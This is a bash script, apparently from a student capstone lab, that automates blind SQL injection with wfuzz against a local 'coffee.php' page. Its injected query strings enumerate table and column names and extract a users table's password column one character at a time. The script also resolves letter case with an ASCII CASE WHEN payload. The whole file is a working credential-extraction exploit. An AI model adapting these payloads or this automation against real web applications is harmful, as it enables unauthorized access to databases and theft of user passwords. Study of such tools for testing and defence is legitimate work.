#!/bin/bash


echo '-----BlindSQL Password Fuzzer v1.0-----'
#Add more config options
echo "^-v-^-v-^-FUZZING-^-v-^-v-^"
echo ""
tableNumber=$3
wordList=$1
finalColumnName=$2
badSizeNumber=6566

wFuzzRun(){ #Pass #charNumber and $passwordSoFar

#local vars
local charNumber=$1
local passwordSoFar=$2

#countColumns
CountColumnsPayLoad="OR (SELECT COUNT(*) FROM users WHERE $finalColumnName IS NOT NULL) = FUZZ%23"
#table names
TablesPayLoad="OR (SELECT SUBSTRING(table_name, 1, ${charNumber}) FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT $tableNumber,1) = '${passwordSoFar}FUZZ'%23"
#column names
ColumnsPayLoad="OR (SELECT SUBSTRING(column_name, 1, ${charNumber}) FROM information_schema.columns WHERE table_name = 'users' LIMIT $tableNumber,1) = '${passwordSoFar}FUZZ'%23"
#exfiltrate from the column
FinalPayLoad="OR (SELECT SUBSTRING($finalColumnName, 1, ${charNumber}) FROM users LIMIT $tableNumber,1) = '${passwordSoFar}FUZZ'%23"
wfuzz -u "http://localhost/capstone/coffee.php?coffee=0'%20$FinalPayLoad" -z file,$wordList,urlencode --hh $badSizeNumber -o raw
}


passwordSoFar=""

for attempt in {1..100}; do

charNumber=$attempt
rawResult=$(wFuzzRun $charNumber $passwordSoFar)
processedResult=$(printf "%s" "$rawResult" | grep -vi 'Target\|Request\|==\|Response\|time' | awk '{print $9}' | tr -d '"[:space:]')
numberOfAlphaChars=$(echo -n "$processedResult" | wc -c)

if [ "$numberOfAlphaChars" -eq 0 ]; then
   echo -e "No more valid returns. Try Table : \033[0:32m'$passwordSoFar'"
   echo "Also, check duplicate characters and try switching case. Cya!!"
   break
fi

if [ "$numberOfAlphaChars" -eq 2 ]; then #deal with duplicates but leave special encoded chars like %24
   upperOrLowerCase=$(wfuzz -u "http://localhost/capstone/coffee.php?coffee=0' OR (SELECT CASE WHEN ASCII(SUBSTRING(password, $charNumber, $charNumber)) BETWEEN 65 AND 90 THEN 1 ELSE 0 END FROM users LIMIT 1,1) = FUZZ%23" -z range,0-1,urlencode --hh $badSizeNumber -o raw | grep -vi 'Target\|Request\|==\|Response\|time' | awk '{print $9}' | tr -d '"[:space:]')
   if [ "$upperOrLowerCase" -eq 1 ]; then
	refinedResult=$(echo -n $processedResult | tr [:lower:] [:upper:] | fold -w1 | sort -u)
   	echo -e "\033[0;31m[!] Found Duplicate!\033[0m Converting character[$charNumber] to lowercase : \033[0;32m'$refinedResult'"
   	passwordSoFar="${passwordSoFar}$refinedResult"
   else
        refinedResult=$(echo -n $processedResult | tr [:upper:] [:lower:] | fold -w1 | sort -u)
        echo -e "\033[0;31m[!] Found Duplicate!\033[0m Converting character[$charNumber] to uppercase : \033[0;32m'$refinedResult'"
        passwordSoFar="${passwordSoFar}$refinedResult"
   fi
else
   echo -e "\033[0;32m[+]\033[0m Character[$charNumber] = \033[0;32m'$processedResult\033[0m'"
   passwordSoFar="${passwordSoFar}$processedResult"
fi

#echo "$processedResult"
#echo "$refinedResult"
done

